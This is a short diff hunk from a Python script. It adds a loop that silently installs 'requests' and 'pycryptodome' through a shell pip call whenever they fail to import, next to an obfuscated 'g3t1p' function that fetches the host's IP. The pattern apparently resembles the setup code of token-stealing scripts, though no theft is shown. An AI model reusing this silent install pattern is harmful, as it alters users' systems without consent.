@@ -56,3 +56,14 @@ def g3t1p():
     except:
         pass
     return ip
+
+
+requirements = [
+    ["requests", "requests"],
+    ["Crypto.Cipher", "pycryptodome"],
+]
+for modl in requirements:
+    try: __import__(modl[0])
+    except:
+        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
+        time.sleep(3)
